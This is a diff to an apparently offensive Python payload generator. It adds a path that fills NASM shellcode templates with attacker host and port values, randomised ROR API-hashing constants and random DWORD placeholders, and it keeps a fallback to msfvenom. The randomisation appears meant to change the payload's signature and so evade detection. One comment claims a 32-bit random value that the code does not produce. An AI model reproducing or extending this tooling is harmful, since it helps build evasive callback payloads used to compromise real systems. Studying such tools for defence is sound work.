@@ -52,7 +52,26 @@ def main():
 
     if is_set(config.get("Payload", "name")):
         PAYLOAD_NAME = config.get("Payload", "name")
-        msfvenom(PAYLOAD_NAME, RHOST, RPORT, RURI)
+        if ".asm" in PAYLOAD_NAME or ".nasm" in PAYLOAD_NAME:
+            ROR_VALUE = random.choice([13,17,19,21,23])
+            sed_file(WORKING_FOLDER+PAYLOAD_NAME, "%ROR_VALUE%", hex(ROR_VALUE))
+            sed_file(WORKING_FOLDER+PAYLOAD_NAME, "%LHOST__LPORT%", format_lhost_lport(RHOST,RPORT))
+            remaining_tags = extract_tags_from_file(WORKING_FOLDER+PAYLOAD_NAME)
+
+            # Tags like %HASH_MODULE_FUNCTION% are replaced by their hash
+            for tag in remaining_tags:
+                parts = tag.replace("%", "").split("__")
+                if parts[0] == "HASH":
+                    sed_file(WORKING_FOLDER+PAYLOAD_NAME, tag, hex(hash(parts[1], parts[2], ROR_VALUE)))
+                if parts[0] == "RANDOM":
+                    # Générer une valeur aléatoire de 32 bits
+                    dword_value = random.randint(0, 0xFFFFFFF)
+                    sed_file(WORKING_FOLDER+PAYLOAD_NAME, tag, hex(dword_value))
+            instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_NAME)
+            with open("temp/payload.txt", "w") as f:
+                f.write(str(instructions))
+        else:
+            msfvenom(PAYLOAD_NAME, RHOST, RPORT, RURI)
         PAYLOAD_FILE = "payload.txt"
     else:
         print("No payload file or payload name specified")
@@ -141,9 +160,9 @@ def main():
 
 
     if PAYLOAD_FILE.endswith(".bin") or PAYLOAD_FILE.endswith(".raw"):
-        instructions = bin2instructions(WORKING_FOLDER+PAYLOAD_FILE)
+        instructions = bin2instructions(WORKING_FOLDER+PAYLOAD_NAME)
     elif PAYLOAD_FILE.endswith(".txt"):
-        instructions = txt2instructions(WORKING_FOLDER+PAYLOAD_FILE)
+        instructions = txt2instructions(WORKING_FOLDER+"payload.txt")
     else:
         print(f"Unknown file format of the payload : {PAYLOAD_FILE}")
         sys.exit(1)
